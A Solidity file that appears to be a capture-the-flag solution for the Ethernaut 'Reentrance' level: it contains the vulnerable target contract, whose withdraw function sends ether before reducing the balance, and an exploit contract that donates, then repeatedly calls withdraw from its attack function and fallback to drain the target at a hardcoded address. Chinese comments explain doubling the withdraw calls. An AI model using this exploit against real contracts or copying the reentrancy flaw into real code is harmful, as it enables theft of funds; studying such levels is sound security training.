pragma solidity ^0.4.18;

contract Reentrance {

  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] += msg.value;
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      if(msg.sender.call.value(_amount)()) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  function() public payable {}
}

contract exp {

    address instance_address = 0xe0216ad7f44524508a87036609c91f85ff6343bf;
    Reentrance target = Reentrance(instance_address);

    function exp() payable{}

    function donate() public payable {
        target.donate.value(msg.value)(this);
    }

    function attack() public {
        //这题有bug，不会自己回调fallback函数，要你写两次withdraw才可以
        target.withdraw(0.5 ether);
        target.withdraw(0.5 ether);
    }

    function get_balance() public view returns(uint) {
        return target.balanceOf(this);
    }

    function my_eth_bal() public view returns(uint) {
        return address(this).balance;
    }

    function ins_eth_bal() public view returns(uint) {
        return instance_address.balance;
    }

    function () public payable {
        //同理写两次
        target.withdraw(0.5 ether);
        target.withdraw(0.5 ether);
    }
}